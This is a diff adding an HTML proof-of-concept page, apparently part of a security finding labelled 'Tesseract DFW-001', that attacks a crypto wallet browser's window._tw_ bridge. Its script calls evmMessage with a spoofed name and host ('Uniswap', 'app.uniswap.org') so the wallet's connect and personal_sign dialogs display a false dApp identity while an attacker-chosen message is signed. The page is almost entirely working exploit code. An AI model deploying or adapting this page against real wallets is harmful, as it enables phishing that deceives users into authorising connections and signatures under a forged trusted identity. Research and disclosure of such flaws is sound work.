@@ -1,0 +1,41 @@
+<!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
+<title>dfw-sign-spoof</title></head>
+<body style="font:15px monospace;padding:18px;background:#111;color:#0f0">
+<h3>Tesseract DFW-001 — personal_sign identity-spoof (post-connect)</h3>
+<pre id=log>loading…</pre>
+<button id=connect style="font-size:17px;padding:12px;margin-top:10px">1) connect (spoof Uniswap)</button>
+<button id=sign style="font-size:17px;padding:12px;margin-top:10px">2) personal_sign (spoof Uniswap)</button>
+<script>
+// Attacker page served from this (real) origin, but every _tw_ call claims to be Uniswap.
+var SPOOF_NAME = "Uniswap";
+var SPOOF_HOST = "app.uniswap.org";
+function L(m){var e=document.getElementById('log');e.innerText+=("\n"+m);}
+function bridge(){return window._tw_;}
+function doConnect(){
+  try{
+    var b=bridge(); L("real_origin="+location.host);
+    if(!b){L("NO _tw_ bridge");return;}
+    var ms=[];for(var k in b){ms.push(k);} L("bridge methods="+ms.join(","));
+    var req={method:"eth_requestAccounts",params:[]};
+    L("CONNECT -> evmMessage('"+SPOOF_NAME+"','"+SPOOF_HOST+"', eth_requestAccounts,'0x1')");
+    var r=b.evmMessage(SPOOF_NAME,SPOOF_HOST,JSON.stringify(req),"0x1");
+    L("connect returned: "+r+"  (approve the spoofed connect dialog, then tap 2)");
+  }catch(e){L("ERR connect "+e);}
+}
+function doSign(){
+  try{
+    var b=bridge();
+    if(!b){L("NO _tw_ bridge");return;}
+    // personal_sign needs NO funds. Param order: [hexMessage, address].
+    // Address left as placeholder; wallet fills the connected account. Message is attacker-chosen.
+    var msgHex="0x"+Array.prototype.map.call("Sign in to Uniswap",function(c){return c.charCodeAt(0).toString(16).padStart(2,'0');}).join("");
+    var req={method:"personal_sign",params:[msgHex,"0x0000000000000000000000000000000000000000"]};
+    L("SIGN -> evmMessage('"+SPOOF_NAME+"','"+SPOOF_HOST+"', personal_sign,'0x1')");
+    var r=b.evmMessage(SPOOF_NAME,SPOOF_HOST,JSON.stringify(req),"0x1");
+    L("personal_sign returned: "+r+"  -> expect a SIGN dialog still showing '"+SPOOF_NAME+" / "+SPOOF_HOST+"' (real="+location.host+")");
+  }catch(e){L("ERR sign "+e);}
+}
+document.getElementById('connect').onclick=doConnect;
+document.getElementById('sign').onclick=doSign;
+window.onload=function(){L("rendered. real origin="+location.host);};
+</script></body></html>
